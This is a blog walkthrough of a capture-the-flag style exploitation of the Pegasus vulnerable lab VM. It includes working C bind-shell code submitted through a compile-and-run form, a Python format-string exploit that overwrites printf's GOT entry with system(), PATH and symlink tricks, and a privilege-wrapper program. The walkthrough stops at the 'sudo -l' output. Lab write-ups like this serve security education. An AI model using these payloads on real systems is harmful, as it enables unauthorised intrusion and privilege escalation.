
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Because she was a princess she had a Pegasus. - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="Knapsy (blog) released Pegasus - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">Because She Was a Princess She Had a Pegasus.</h2>
	<div class="entry-content"><p><a href="https://twitter.com/theknapsy">Knapsy</a> (<a href="https://knapsy.github.io/">blog</a>) released <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to experience the VM at the same time as everyone else.</p>

<p>People generally work alone on VM&rsquo;s, so to mix it up a bit, I decided to team up with <a href="https://twitter.com/barrebas">barrebas</a> (<a href="https://barrebas.github.io/">blog</a>) and own the VM as a collaboration :)</p>

<p>So, here&rsquo;s a quick walkthrough on how to root Pegasus, written by both barrebas and myself.</p>

<!-- more -->


<h1>Getting a Foot(hoof?)hold</h1>

<p><img src="http://awesomelytechie.com/wp-content/uploads/2013/08/Lets-get-down-to-business.gif" alt="" /></p>

<p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:31 GMT
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
</span><span class='line'>Host is up <span class="o">(</span>0.000063s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65526</span> closed ports
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>22/tcp    open  ssh
</span><span class='line'>111/tcp   open  rpcbind
</span><span class='line'>8088/tcp  open  radan-http
</span><span class='line'>
</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.74 seconds
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png" alt="pegasus_001" /></a></p>

<p>Time to brute force some directories/files. Experience has shown me that vulnerable VM creators are sneaky gits, so I opted to use a large dictionary here, just to see what it came up with. Because of this large dictionary, I had to use dirbuster instead of dirb, because dirb takes ages to parse large dictionary files. Prepare for some horrible UI screenshots&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png" alt="pegasus_002" /></a></p>

<p>I&rsquo;m only interested in the files that returned HTTP 200, as these actually exist, so submit.php and codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png" alt="pegasus_003" /></a></p>

<p>codereview.php POSTS to submit.php, so for the moment I can ignore submit.php and focus on codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png" alt="pegasus_004" /></a></p>

<p><img src="http://i527.photobucket.com/albums/cc352/gabzylovescrack/HTTYD/Shudder.gif" alt="" /></p>

<p>Mike is a code reviewer, and a trainee&hellip; therefore is pretty inexperienced. After a bit of time throwing various languages at the application, I found out that if you provide C sourcecode, it gets compiled and executed. Nice ! Lets bash some shellcode in there - specifically a bind shell and submit it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">dstport</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">o</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">mysockaddr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">//setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don&#39;t have space for</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> <span class="c1">//2</span>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dstport</span><span class="p">);</span>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span> <span class="c1">//0</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">mysockaddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mysockaddr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>A quick NMAP scan confirms port 4444 has been opened.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p4444 -T5 172.16.231.132
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:47 GMT
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
</span><span class='line'>Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>4444/tcp open  krb524
</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.04 seconds
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nv 172.16.231.132 4444
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.231.132<span class="o">]</span> <span class="m">4444</span> <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>mike@pegasus:/home/mike<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span>
</span><span class='line'>mike@pegasus:/home/mike<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now over to barrebas for the next step ! <em>fancy screen wipe animation</em></p>

<hr />

<p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'><span class="o">[</span>/plain<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>The mail in /var/mail/mike mentions a git repo with the <span class="nb">source </span>code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I <span class="k">then</span> went <span class="k">for</span> the calculator, entering:
</span><span class='line'>
</span><span class='line'><span class="o">[</span>plain <span class="nv">gutter</span><span class="o">=</span><span class="s2">&quot;false&quot;</span><span class="o">]</span>
</span><span class='line'>Selection: 1
</span><span class='line'>
</span><span class='line'>Enter first number: 5
</span><span class='line'>Enter second number: AAAA
</span><span class='line'>Error details: AAAA
</span></code></pre></td></tr></table></div></figure>


<p>That seemed promising. I entered:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
</span><span class='line'>
</span><span class='line'>Enter first number: 5
</span><span class='line'>Enter second number: %x
</span><span class='line'>Error details: bff1039c
</span></code></pre></td></tr></table></div></figure>


<p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>ldd my_first
</span><span class='line'>  linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x40022000<span class="o">)</span>
</span><span class='line'>  libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0x4002a000<span class="o">)</span>
</span><span class='line'>  /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>080483b0 &lt;<span class="nb">printf</span>@plt&gt;:
</span><span class='line'> 80483b0: ff <span class="m">25</span> <span class="nb">fc </span>9b <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049bfc
</span><span class='line'> 80483b6: <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x0</span>
</span><span class='line'> 80483bb: e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
</span><span class='line'>
</span><span class='line'>Enter first number: 5
</span><span class='line'>Enter second number: AAAA%8<span class="nv">$x</span>
</span><span class='line'>Error details: AAAA41414141
</span></code></pre></td></tr></table></div></figure>


<p>So I got working on an exploit. I quickly came up with this python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start calculator thingie</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">5</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite first part of got pointer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfe</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%16386c</span><span class="s">%8$hn&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite second part of got pointer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfc</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%20566c</span><span class="s">%12$hn&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># exit program</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;4</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>

<p>Then, it takes the 12th argument, which is the pointer to the second half of the got entry. It writes some dummy bytes and then the outputs the number of bytes written to the got address. Effectively, after running the exploit, the memory location at 0x8049bfc now contains 0x40069060. This is the address of system in libc after running the ulimit trick.</p>

<p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>python exploit.py <span class="p">|</span> ./my_first
</span><span class='line'>
</span><span class='line'>...snip...
</span><span class='line'>
</span><span class='line'>sh: 1: Selection:: not found
</span><span class='line'>
</span><span class='line'>Goodbye!
</span></code></pre></td></tr></table></div></figure>


<p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>ln -s /bin/dash Selection:
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;.:$PATH&quot;</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="o">(</span>python ./exploit.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./my_first
</span><span class='line'>
</span><span class='line'>...snip...
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 165, in spawn
</span><span class='line'>    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 107, in fork
</span><span class='line'>    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 29, in openpty
</span><span class='line'>    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 70, in _open_terminal
</span><span class='line'>    raise os.error, <span class="s1">&#39;out of pty devices&#39;</span>
</span><span class='line'>OSError: out of pty devices
</span></code></pre></td></tr></table></div></figure>


<p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
</span><span class='line'><span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'><span class="n">setregid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'><span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/tmp/a.out
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>john@pegasus:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> john on this host:
</span><span class='line'>    env_reset,
</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User john may run the following commands on this host:
